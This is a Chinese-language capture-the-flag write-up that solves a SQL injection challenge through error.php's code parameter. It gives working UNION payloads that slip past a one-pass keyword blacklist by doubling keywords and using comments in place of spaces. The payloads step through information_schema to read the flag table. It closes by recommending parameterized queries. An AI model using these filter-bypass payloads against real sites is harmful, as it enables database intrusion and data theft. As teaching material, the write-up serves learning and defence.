# Pokemon

## 题目简述

访问 `/index.php?id=1` 可以看到正常页面；当 `id` 不是 `1`、`2`、`3` 时，站点跳转到 `/error.php?code=404`。真正的 SQL 注入点位于 `error.php` 的数字型 `code` 参数，服务端使用一次 `preg_replace()` 过滤了空白和若干 SQL 关键字，需要通过注释与双写恢复被删除的内容。

## 解题过程

源码过滤的重点包括空格以及 `union`、`select`、`where`、`from`、`and`、`or`、`=` 等字符串。对应的绕过方法是：

- 用未被规则命中的块注释（如 `/*1*/`）代替空格；
- 把关键字嵌进自身，例如 `ununionion` 经一次删除 `union` 后恢复为 `union`；
- `select`、`from`、`where` 分别写成 `selselectect`、`frfromom`、`whewherere`；
- 注意 `information_schema` 自身含有 `or`，因此写成 `infoorrmation_schema`；
- 用 `regexp` 代替等号比较。

先确认当前数据库：

```text
404/*1*/ununionion/*1*/selselectect/*1*/111,database()
```

回显得到数据库名 `pokemon`。继续枚举该库的表：

```text
404/*1*/ununionion/*1*/selselectect/*1*/111,group_concat(table_name)/*1*/frfromom/*1*/infoorrmation_schema.tables/*1*/whewherere/*1*/table_schema/*1*/regexp/*1*/"^pokemon$"
```

得到表名 `fllllllllaaaaaag`。再查询其列名：

```text
404/*1*/ununionion/*1*/selselectect/*1*/111,group_concat(column_name)/*1*/frfromom/*1*/infoorrmation_schema.columns/*1*/whewherere/*1*/table_name/*1*/regexp/*1*/"^fllllllllaaaaaag$"
```

确认目标列名为 `flag` 后读取数据：

```text
404/*1*/ununionion/*1*/selselectect/*1*/111,flag/*1*/frfromom/*1*/fllllllllaaaaaag
```

将上述字符串作为 `/error.php?code=` 的参数提交；浏览器直接输入时需要对引号、`#` 等保留字符做 URL 编码。官方题解没有保存最终 flag 文本，但数据库、表、列的逐层定位和最终读取语句是完整的，不影响复现。

## 方法总结

黑名单删除不能安全地净化 SQL。单次替换尤其容易遭到双写绕过，而过滤空格、等号或少数关键字也挡不住注释、同义运算符和其他语法变体。正确做法是使用参数化查询，把用户输入始终作为数据绑定；数据库账号还应遵循最小权限，减少注入成功后的暴露范围。
